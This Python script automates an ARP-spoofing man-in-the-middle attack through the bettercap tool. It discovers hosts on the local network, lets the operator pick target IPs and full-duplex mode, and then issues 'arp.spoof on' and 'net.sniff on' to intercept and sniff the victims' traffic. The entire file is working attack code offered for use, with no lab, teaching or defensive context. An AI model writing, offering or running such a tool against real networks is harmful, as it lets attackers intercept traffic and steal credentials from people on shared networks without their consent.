import subprocess
import sys
import time
import threading
import re
def start_bettercap(iface):
    """Starts the bettercap process and returns the process object."""
    print(f"[*] Starting bettercap on interface {iface}...")
    try:
        proc = subprocess.Popen(
            ["sudo", "bettercap", "-iface", iface],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        time.sleep(2) # Give bettercap a moment to initialize
        return proc
    except FileNotFoundError:
        print("[!] Error: 'bettercap' command not found. Make sure it's installed and in your PATH.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An error occurred while starting bettercap: {e}")
        sys.exit(1)


def discover_devices(proc):
    """Runs net.probe and net.show to discover and list devices."""
    devices = []
    # Use a thread to read output in the background
    output_lines = []
    stop_reading = threading.Event()

    def read_output():
        while not stop_reading.is_set():
            line = proc.stdout.readline()
            if line:
                print(line, end="")
                output_lines.append(line)

    t = threading.Thread(target=read_output)
    t.start()

    # Start discovery
    proc.stdin.write("net.probe on\n")
    proc.stdin.flush()
    print("[*] Device discovery started. Let it run for a bit to find devices...")
    input("[*] Press Enter when you are ready to see the list of discovered devices...\n")

    # Stop discovery and show results
    proc.stdin.write("net.probe off\n")
    proc.stdin.flush()
    time.sleep(1)
    proc.stdin.write("net.show\n")
    proc.stdin.flush()
    time.sleep(2) # Wait for net.show to populate

    stop_reading.set()
    t.join()
    
    # Regex to parse the net.show table format
    # Example line: "192.168.1.100  00:1a:2b:3c:4d:5e   My-PC   ..."
    device_regex = re.compile(r"^(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(?P<mac>([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+(?P<name>.*?)\s+(?P<vendor>.*?)\s+.*")
    
    print("\n--- Parsing Discovered Devices ---")
    for line in output_lines:
        match = device_regex.match(line.strip())
        if match:
            device_info = match.groupdict()
            devices.append(device_info)
    
    if not devices:
        print("[!] No devices were found. Exiting.")
        proc.terminate()
        sys.exit(1)

    return devices


def get_user_choices(devices):
    """Displays devices and gets the user's target and fullduplex choices."""
    print("\n[+] Discovered Devices:")
    for i, device in enumerate(devices):
        print(f"  [{i}] IP: {device['ip']:<15} MAC: {device['mac']:<17} Name: {device.get('name', 'N/A')}")

    # Get target selection
    while True:
        try:
            target_indices_str = input("\n[*] Enter the number(s) of the target(s) (e.g., 0 or 1,3): ")
            target_indices = [int(i.strip()) for i in target_indices_str.split(',')]
            
            # Validate indices
            if all(0 <= index < len(devices) for index in target_indices):
                selected_ips = [devices[i]['ip'] for i in target_indices]
                targets_str = ",".join(selected_ips)
                break
            else:
                print("[!] Invalid selection. Please enter number(s) from the list above.")
        except ValueError:
            print("[!] Invalid input. Please enter numbers only.")

    # Get fullduplex choice
    while True:
        choice = input("[*] Enable full-duplex ARP spoofing? (y/n): ").strip().lower()
        if choice in ['y', 'yes']:
            fullduplex = "true"
            break
        elif choice in ['n', 'no']:
            fullduplex = "false"
            break
        else:
            print("[!] Invalid choice. Please enter 'y' or 'n'.")
            
    return targets_str, fullduplex


def run_attack(proc, targets, fullduplex):
    """Constructs and sends the final attack command to bettercap."""
    command = f"set arp.spoof.fullduplex {fullduplex}; set arp.spoof.targets {targets}; arp.spoof on; net.sniff on"
    print(f"\n[+] Executing command: {command}")
    proc.stdin.write(command + "\n")
    proc.stdin.flush()
    print("\n[***] ARP spoofing and sniffing started! Press Ctrl+C to exit. [***]")

    # Pass control to the interactive bettercap session
    try:
        while True:
            line = proc.stdout.readline()
            if not line:
                break
            print(line, end="")
    except KeyboardInterrupt:
        print("\n[*] Stopping bettercap and exiting...")
        proc.terminate()
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
        proc.terminate()




def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <network_interface>")
        sys.exit(1)
    iface = sys.argv[1]

    # Step 1: Start bettercap
    proc = start_bettercap(iface)
    # time.sleep(2)  # edge case: ensure bettercap is ready
    if not proc:
        print("[!] Failed to start bettercap. Exiting.")
        sys.exit(1)
    # Step 2: Discover devices
    devices = discover_devices(proc)
    if not devices:
        print("[!] No devices found. Exiting.")
        proc.terminate()
        sys.exit(1)
    # Step 3: Get user choices
    targets, fullduplex = get_user_choices(devices)
    # Step 4: Run the attack
    run_attack(proc, targets, fullduplex)

if __name__ == "__main__":
    main()